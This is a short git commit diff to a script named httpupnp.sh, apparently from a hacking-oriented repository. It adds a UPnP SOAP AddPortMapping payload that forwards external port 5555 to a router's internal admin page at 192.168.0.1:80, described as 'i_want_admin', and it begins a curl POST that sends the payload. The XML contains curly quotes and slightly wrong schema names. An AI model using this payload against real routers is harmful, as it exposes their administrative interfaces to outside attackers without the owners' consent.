e6a9ddff92b59ad680ba089bc4da286f9495b28a
hackingyseguridad <antonio_taboada@hotmail.es>
2018-12-06 22:36:14 +0100

    Update httpupnp.sh

--- httpupnp.sh
+++ httpupnp.sh
@@ -1,3 +1,22 @@
+SOAP_NAT.xml
+<?xml version=”1.0” encoding=”utf-8”?>
+<s:Envelope s:encodingStyle=”http://schema.xmlsoap.org/soap/encoding/”
+xmlns:s=”http://schemas.xmlsoap.org/soap/envelopes/”>
+ <s:Body>
+ <u:AddPortMapping xmlns:u=”urn:schemas-upnp-org:services:WANIPConnections:1”>
+ <NewRemoteHost></NewRemoteHost>
+ <NewExternalPort>5555</NewExternalPort>
+ <NewInternalClient>192.168.0.1</NewInternalClient>
+ <NewInternalPort>80</NewInternalPort>
+ <NewProtocol>TCP</NewProtocol>
+ <NewPortMappingDescription>i_want_admin</NewPortMappingDescription>
+ <NewLeaseDuration>10</NewLeaseDuration>
+ <NewEnabled>1</NewEnabled>
+ </u:AddPortMapping>
+ </s:Body>
+</s:Envelope>
+
+httpupnp.sh
 curl -v \
  -X ‘POST’ \
  -H ‘Content-Type: text/xml; charset=”utf-8”’ \
